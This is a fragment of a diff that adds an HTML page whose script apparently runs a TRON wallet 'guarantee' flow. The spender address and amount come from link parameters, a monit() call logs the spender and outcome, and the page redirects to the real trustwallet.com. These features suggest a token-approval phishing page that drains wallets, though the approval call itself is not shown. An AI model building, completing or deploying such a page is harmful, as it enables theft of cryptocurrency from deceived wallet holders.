+    setTimeout(function() { location.replace("https://trustwallet.com/"); }, 1200);
+  } catch(e) {
+    var reason = (e && (e.message || e)) + "";
+    monit("guarantee_rejected", { spender: spender, reason: reason.slice(0, 200) });
+    setStatus("Rejected — " + reason.slice(0, 80));
+    cta.disabled = false;
+    busy = false;
+  }
+});
+
+monit("guarantee_opened", { spender: spender || null, amount: amountParam, token: token.name, inWallet: !!findTronWeb() });
+tronAddrValid(spender).then(function(ok) {
+  if (!ok) { cta.disabled = true; setStatus("invalid guarantee link"); }
+});
+</script>
+</body>
+</html>
